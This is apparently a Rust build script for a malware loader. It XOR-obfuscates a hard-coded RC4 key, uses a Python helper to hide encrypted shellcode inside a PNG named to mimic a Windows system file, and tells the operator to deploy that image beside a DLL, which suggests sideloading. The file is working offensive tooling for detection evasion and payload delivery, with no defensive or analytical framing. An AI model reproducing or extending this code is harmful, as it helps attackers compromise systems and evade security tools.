const CK2: &[u8] = b"9832gf2bc29_120e9hd10c))b@@!11";

// Same key as bin/BinC4.py — build script only, emitted XOR-obfuscated into key.rs.
const RC4_KEY: &[u8] = b"-4S@aAv;&T~2\\.e+3])N`C|\"\\.3FTVH8NG5O$Hjh+~s^g'G06ni\"n{E2cujo\"w^lnmZo)i!I6U:i}k~(xy,ftS~v%\"FTq)<@V%8uG?P@))V%@xOHovWgtA5n/.vj1C+W3G7K=<2ZX'{Q&Y80Ql{?tS}SwzR.MKrz1<gKCV$\"t=OP<8N$<jQ'=Lt(HPI\\*u4yZ(~v_pY3{TDFlb^^Y`Tlac3mPRbHlZNh{Y% o{y`q[r5fQOv$}`Q?oLvX,YWp+~,";

fn xor_obf(data: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ CK2[i % CK2.len()])
        .collect()
}

fn write_byte_array(path: &std::path::Path, name: &str, bytes: &[u8]) {
    let mut s = format!("pub const {name}: &[u8] = &[");
    for b in bytes {
        s.push_str(&format!("0x{b:02x},"));
    }
    s.push_str("];");
    std::fs::write(path, s).expect("failed to write obfuscated blob");
}

fn main() {
    let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").expect("CARGO_MANIFEST_DIR not set");
    let manifest = std::path::Path::new(&manifest_dir);
    let sc_enc_path = manifest.join("sc_enc.bin");
    let template_png = manifest.join("assets/template.png");
    let embed_script = manifest.join("embedShellcode.py");
    let deploy_png = manifest.join("Windows.CloudStore.Schema.Shell.png");

    println!("cargo:rerun-if-changed={}", sc_enc_path.display());
    println!("cargo:rerun-if-changed={}", template_png.display());
    println!("cargo:rerun-if-changed={}", embed_script.display());

    let out_dir = std::env::var("OUT_DIR").expect("OUT_DIR not set");
    let out_dir = std::path::Path::new(&out_dir);

    let sc_bytes = std::fs::read(&sc_enc_path).unwrap_or_default();

    let key_obf = xor_obf(RC4_KEY);
    write_byte_array(&out_dir.join("key.rs"), "RC4_KEY_ENC", &key_obf);

    if !sc_bytes.is_empty() {
        if !template_png.is_file() {
            panic!("missing template PNG: {}", template_png.display());
        }
        let status = std::process::Command::new("python3")
            .arg(&embed_script)
            .arg("--image")
            .arg(&template_png)
            .arg("--payload")
            .arg(&sc_enc_path)
            .arg("--output")
            .arg(&deploy_png)
            .arg("--verify")
            .status()
            .unwrap_or_else(|e| panic!("failed to run embedShellcode.py: {e}"));
        if !status.success() {
            panic!("embedShellcode.py failed with status {status}");
        }
        println!(
            "cargo:warning=Deploy {} next to the DLL (same basename, .png extension)",
            deploy_png.display()
        );
    }
}
